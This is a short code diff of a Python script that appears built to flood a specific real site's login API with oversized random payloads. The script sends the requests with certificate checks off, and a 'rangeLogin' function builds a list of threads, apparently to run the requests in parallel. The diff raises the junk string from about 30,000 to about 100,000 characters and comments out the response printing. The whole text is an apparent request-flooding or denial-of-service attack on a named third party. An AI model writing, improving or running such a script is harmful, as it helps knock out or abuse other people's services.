@@ -10,7 +10,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 def generate_random_string(length):
     letters_and_digits = string.ascii_letters + string.digits
     return ''.join(random.choice(letters_and_digits) for i in range(length))
-fk = generate_random_string(29699)
+fk = generate_random_string(99699)
 print(fk)
 def GenLogin():
     url = 'https://backend.kibomodz.online/api/users/login'
@@ -29,7 +29,7 @@ def GenLogin():
 
     response = requests.post(url, headers=headers, json=data, verify=False)
     print(response)
-    print(response.text)
+    #print(response.text)
 
 def rangeLogin():
     threads = []
